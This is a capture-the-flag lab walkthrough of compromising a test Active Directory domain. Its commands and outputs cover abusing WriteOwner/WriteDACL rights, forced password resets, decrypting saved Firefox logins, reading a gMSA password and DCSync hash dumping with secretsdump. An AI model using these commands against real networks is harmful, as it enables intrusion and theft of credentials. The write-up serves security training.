---
cover: ../.gitbook/assets/ab615585-01e0-488a-9e5b-fdb8587c504e.png
coverY: 0
coverHeight: 257
---

# Stellarcomms(AD)

## Initial Enumeration :

* We are provided with a valid username but the the password is unknown

```
Valid User:
Username: junior.analyst
Password: Unknown
```

### NMAP :&#x20;

```
PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 126 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 09-12-25  11:29AM       <DIR>          Docs
| 09-10-25  11:15AM       <DIR>          IT
|_09-10-25  11:44AM       <DIR>          Pics
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-02-07 19:03:04Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: stellarcomms.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: stellarcomms.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: STELLARCOMMS
|   NetBIOS_Domain_Name: STELLARCOMMS
|   NetBIOS_Computer_Name: DC-STELLAR
|   DNS_Domain_Name: stellarcomms.local
|   DNS_Computer_Name: DC-STELLAR.stellarcomms.local
|   DNS_Tree_Name: stellarcomms.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-07T19:04:11+00:00
| ssl-cert: Subject: commonName=DC-STELLAR.stellarcomms.local
| Issuer: commonName=DC-STELLAR.stellarcomms.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-14T20:49:24
| Not valid after:  2026-07-16T20:49:24
| MD5:     60b7 e7b5 e059 9638 3b29 0c74 26c7 feb8
| SHA-1:   505d 8c3a b2b5 85aa 8166 55c6 53d9 1af4 058a 83aa
| SHA-256: aafc f7d0 561b ca6f 21e5 4fc7 d7eb ce27 045d 773e 4cd2 6201 9d45 0979 6c3f a56d
|_ssl-date: 2026-02-07T19:04:32+00:00; -2s from scanner time.
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
47001/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49675/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49685/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```

#### FTP(port 21):

* As we saw that `anonymous` ftp login is allowed

<figure><img src="../.gitbook/assets/image (66).png" alt=""><figcaption></figcaption></figure>

* We downloaded all the files that were accessible to us using ftp.\\
* After analysing the files we found a default password in the `Stellar_UserGuide.pdf`&#x20;

<figure><img src="../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

* This likely seemed to be the password for the `junior.analyst` user.
* We verified the credentials to check if it is a valid pair of creds.

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/stellarcomms]
└─$ nxc smb stellarcomms.local -u junior.analyst -p 'Galaxy123!' --shares
SMB         10.1.27.88      445    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:True) (SMBv1:False) 
SMB         10.1.27.88      445    DC-STELLAR       [+] stellarcomms.local\junior.analyst:Galaxy123! 
SMB         10.1.27.88      445    DC-STELLAR       [*] Enumerated shares
SMB         10.1.27.88      445    DC-STELLAR       Share           Permissions     Remark
SMB         10.1.27.88      445    DC-STELLAR       -----           -----------     ------
SMB         10.1.27.88      445    DC-STELLAR       ADMIN$                          Remote Admin
SMB         10.1.27.88      445    DC-STELLAR       C$                              Default share
SMB         10.1.27.88      445    DC-STELLAR       IPC$            READ            Remote IPC
SMB         10.1.27.88      445    DC-STELLAR       NETLOGON        READ            Logon server share 
SMB         10.1.27.88      445    DC-STELLAR       SYSVOL          READ            Logon server share 
```

* These were valid creds and Now we did an `rid-brute` to check all the users in the domain

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/stellarcomms]
└─$ nxc smb stellarcomms.local -u junior.analyst -p 'Galaxy123!' --rid-brute
SMB         10.1.27.88      445    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:True) (SMBv1:False) 
SMB         10.1.27.88      445    DC-STELLAR       [+] stellarcomms.local\junior.analyst:Galaxy123! 
SMB         10.1.27.88      445    DC-STELLAR       498: STELLARCOMMS\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       500: STELLARCOMMS\Administrator (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       501: STELLARCOMMS\Guest (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       502: STELLARCOMMS\krbtgt (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       512: STELLARCOMMS\Domain Admins (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       513: STELLARCOMMS\Domain Users (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       514: STELLARCOMMS\Domain Guests (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       515: STELLARCOMMS\Domain Computers (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       516: STELLARCOMMS\Domain Controllers (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       517: STELLARCOMMS\Cert Publishers (SidTypeAlias)
SMB         10.1.27.88      445    DC-STELLAR       518: STELLARCOMMS\Schema Admins (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       519: STELLARCOMMS\Enterprise Admins (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       520: STELLARCOMMS\Group Policy Creator Owners (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       521: STELLARCOMMS\Read-only Domain Controllers (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       522: STELLARCOMMS\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       525: STELLARCOMMS\Protected Users (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       526: STELLARCOMMS\Key Admins (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       527: STELLARCOMMS\Enterprise Key Admins (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       553: STELLARCOMMS\RAS and IAS Servers (SidTypeAlias)
SMB         10.1.27.88      445    DC-STELLAR       571: STELLARCOMMS\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.1.27.88      445    DC-STELLAR       572: STELLARCOMMS\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.1.27.88      445    DC-STELLAR       1000: STELLARCOMMS\DC-STELLAR$ (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       1101: STELLARCOMMS\DnsAdmins (SidTypeAlias)
SMB         10.1.27.88      445    DC-STELLAR       1102: STELLARCOMMS\DnsUpdateProxy (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       1103: STELLARCOMMS\junior.analyst (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       1104: STELLARCOMMS\ops.controller (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       1105: STELLARCOMMS\astro.researcher (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       1106: STELLARCOMMS\eng.payload (SidTypeUser)
SMB         10.1.27.88      445    DC-STELLAR       1107: STELLARCOMMS\StellarOps-Control (SidTypeGroup)
SMB         10.1.27.88      445    DC-STELLAR       1108: STELLARCOMMS\SATLINK-SERVICE$ (SidTypeUser)
```

## Bloodhound :&#x20;

### Collecting the Loot :&#x20;

* Since now we had a valid set of credentials, we collected the bloodhound loot using `nxc`

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/stellarcomms]
└─$ nxc ldap 10.1.27.88 -u junior.analyst -p 'Galaxy123!' --bloodhound --collection all --dns-server 10.1.27.88
LDAP        10.1.27.88      389    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.27.88      389    DC-STELLAR       [+] stellarcomms.local\junior.analyst:Galaxy123! 
LDAP        10.1.27.88      389    DC-STELLAR       Resolved collection methods: dcom, psremote, rdp, trusts, container, group, objectprops, localadmin, acl, session
LDAP        10.1.27.88      389    DC-STELLAR       Done in 0M 48S
LDAP        10.1.27.88      389    DC-STELLAR       Compressing output into /home/kali/.nxc/logs/DC-STELLAR_10.1.27.88_2026-02-07_141659_bloodhound.zip
```

* Now we go ahead and ingest and analyze it in bloodhound.

### Bloodhound Analysis :

* We can see that the user `junior.analyst` has `writeowner` privileges over the group `STELLAROPS-CONTROl` .

<figure><img src="../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

* Now we abuse those privileges and gain full control.

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/stellarcomms/blood]
└─$ owneredit.py -action write -new-owner 'junior.analyst' -target 'stellarops-control' 'stellarcomms.local'/'junior.analyst':'Galaxy123!'
```

```
──(kali㉿kali)-[~/Desktop/Hacksmarter/stellarcomms/blood]
└─$ dacledit.py -action 'write' -rights 'WriteMembers' -principal 'junior.analyst' -target-dn 'CN=STELLAROPS-CONTROL,CN=USERS,DC=STELLARCOMMS,DC=LOCAL' 'stellarcomms.local'/'junior.analyst':'Galaxy123!'
```

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/stellarcomms/blood]
└─$ net rpc group addmem "stellarops-control" "junior.analyst" -U "stellarcomms.local"/"junior.analyst"%'Galaxy123!' -S "dc01.stellarcomms.local" 
```

* Through the following commands we have added the user `junior.analyst` to the `stellarops-control` group.

## Shell as `ops.controller` :&#x20;

* Now we analyze that this `stellarops-control` Group has `ForceChangePassword` rights over the user `ops.controller`

<figure><img src="../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

* We go ahead and changed the password for this user

```
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/stellarcomms/blood]
└─$ net rpc password "ops.controller" "newP@ssword2022" -U "stellarcomms.local"/"junior.analyst"%'Galaxy123!' -S "dc01.stellarcomms.local"  
```

* We saw that this user was a member of `Remote Management Users` Group.

<figure><img src="../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

* Here we use `evil-winrm` and got the `user.txt` which is the user flag.

<figure><img src="../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

## Lateral Movement :&#x20;

* While enumerating the machine from the `winrm` access, we found out the mozilla app data which had two key files which are `key4.db` and `login.json` which can be utilized.

<figure><img src="../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

* We downloaded both the files and after a bit of research we found out a python script on Github.

{% embed url="https://github.com/lclevy/firepwd/blob/master/firepwd.py" %}

* We used this script for getting the user data.

<figure><img src="../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

* We found out another user and its creds which is `astro.researcher` .
* Now we analyze the user `astro.researcher` permissions on Bloodhound.

<figure><img src="../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

* We saw in bloodhound that this user has an outbound object control which is `writeDACL` permission over the user `ENG.PAYLOAD` .
* Now we abuse this privilege

```
┌──(.venv)─(kali㉿kali)-[~/…/Hacksmarter/stellarcomms/blood/firepwd]
└─$ net rpc password "eng.payload" "newP@ssword2022" -U "stellarcomms.local"/"astro.researcher"%'Cosmos@42' -S "dc01.stellarcomms.local"
```

* Now we saw that this user had an outbound object control over `SATLINK-SERVICES$` Computer account and we can `READGMSAPASSWORD`.

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

* We can use the popular tool `nxc` as it has a  gmsa module for this

```
┌──(kali㉿kali)-[~/…/Hacksmarter/stellarcomms/blood/firepwd]
└─$ nxc ldap stellarcomms.local -u 'eng.payload' -p 'newP@ssword2022' --gmsa
LDAP        10.1.27.88      389    DC-STELLAR       [*] Windows 10 / Server 2019 Build 17763 (name:DC-STELLAR) (domain:stellarcomms.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.1.27.88      389    DC-STELLAR       [+] stellarcomms.local\eng.payload:newP@ssword2022 
LDAP        10.1.27.88      389    DC-STELLAR       [*] Getting GMSA Passwords
LDAP        10.1.27.88      389    DC-STELLAR       Account: SATLINK-SERVICE$     NTLM: aa7754c78ee812b76a6daa03ba4cc52c     PrincipalsAllowedToReadPassword: ['eng.payload', 'SATLINK-SERVICE$']

```

* Through this we were successfully able to retrieve the NTLM hash for this computer account.

## Shell as `Administrator` :&#x20;

* Now through our Bloodhound, We saw that this account had `DCSYNC` rights over the domain

<figure><img src="../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

* Now we use the `impacket-secretsdump` to dump all the hashes of the users in the domain

```
──(kali㉿kali)-[~/…/Hacksmarter/stellarcomms/blood/firepwd]
└─$ secretsdump.py 'stellarcomms.local'/'satlink-service$'@10.1.27.88 -hashes ':aa7754c78ee812b76a6daa03ba4cc52c' -just-dc
/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3a97bfa75ebed92165ea2d67cd21002:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a71b2f34ef6bf1c3a1d748eeea2616ec:::
stellarcomms.local\junior.analyst:1103:aad3b435b51404eeaad3b435b51404ee:5944e69e5f2c6dcffcb218e0b638aeaa:::
stellarcomms.local\ops.controller:1104:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
stellarcomms.local\astro.researcher:1105:aad3b435b51404eeaad3b435b51404ee:4ff610019b56e453b3c476cb34053a99:::
stellarcomms.local\eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:fb54d1c05e301e024800c6ad99fe9b45:::
DC-STELLAR$:1000:aad3b435b51404eeaad3b435b51404ee:0feccb7b614f58fd162a26f3a6f44609:::
SATLINK-SERVICE$:1108:aad3b435b51404eeaad3b435b51404ee:aa7754c78ee812b76a6daa03ba4cc52c:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:bfaf1e64a09cd38cf5f61c308386793e79b354fa338079da920e25e9245de6cb
Administrator:aes128-cts-hmac-sha1-96:03971364600219dc3305f9a37c7d7388
Administrator:des-cbc-md5:f7014cc7e9abbf2a
krbtgt:aes256-cts-hmac-sha1-96:f7bb4a22571764def7d09f40c3c0049cf345b30d1ee939c38caded287969cf96
krbtgt:aes128-cts-hmac-sha1-96:c39955ef6dbc9e5df8538eeef6c84670
krbtgt:des-cbc-md5:4c16bfb6a79bbff2
stellarcomms.local\junior.analyst:aes256-cts-hmac-sha1-96:44baf95a1b4b56eeab90b2f8e20f24e706f33beb0b9c6219fcd1ef63b69c15ca
stellarcomms.local\junior.analyst:aes128-cts-hmac-sha1-96:f68f7da5afc1611a334316010f4b2145
stellarcomms.local\junior.analyst:des-cbc-md5:3d67cd266e2a9e31
stellarcomms.local\ops.controller:aes256-cts-hmac-sha1-96:908c183cace3debf6a41fbb18511f166b32574de6d653125ed7729638f82fb21
stellarcomms.local\ops.controller:aes128-cts-hmac-sha1-96:e7b13f43d6982e4c641686855109005f
stellarcomms.local\ops.controller:des-cbc-md5:29bfc1d6d36d0d01
stellarcomms.local\astro.researcher:aes256-cts-hmac-sha1-96:cee970e6e9f45ffde1ee3a220d9ff7f00f6c9e8fddf2d81f9871ecbd02da3d64
stellarcomms.local\astro.researcher:aes128-cts-hmac-sha1-96:8b14ae2bddc8f12a4052376c0efc2e0b
stellarcomms.local\astro.researcher:des-cbc-md5:195b1c9b3437e3c8
stellarcomms.local\eng.payload:aes256-cts-hmac-sha1-96:d3d983dc4f765d3c9c73c5f2526c0c14b66e91a94c5d9a995628d625f066070f
stellarcomms.local\eng.payload:aes128-cts-hmac-sha1-96:b5eb8688790c100885f0a3a6f5a2d51f
stellarcomms.local\eng.payload:des-cbc-md5:6b97ab2a4f620275
DC-STELLAR$:aes256-cts-hmac-sha1-96:4bfcd54958b8a63697d6287da0a47bf877a1b818662f21272f0a77c5f348be29
DC-STELLAR$:aes128-cts-hmac-sha1-96:1af64a97b76dfb02bfe6c062f3520e76
DC-STELLAR$:des-cbc-md5:6bb32908928ceaa1
SATLINK-SERVICE$:aes256-cts-hmac-sha1-96:62975a304492523a393b5b06b65b0fb3f3cb05f99d04fce6acbd98cac4315db3
SATLINK-SERVICE$:aes128-cts-hmac-sha1-96:5044db4a57f4e0273f331d8de6f8ef3f
SATLINK-SERVICE$:des-cbc-md5:c40732dcd96738df
[*] Cleaning up... 

```

* Now we got the Administrator hash and now we use `evil-winrm` to get in the machine as Administrator.

<figure><img src="../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

* Now we Have owned this Domain and got the root flag!!!
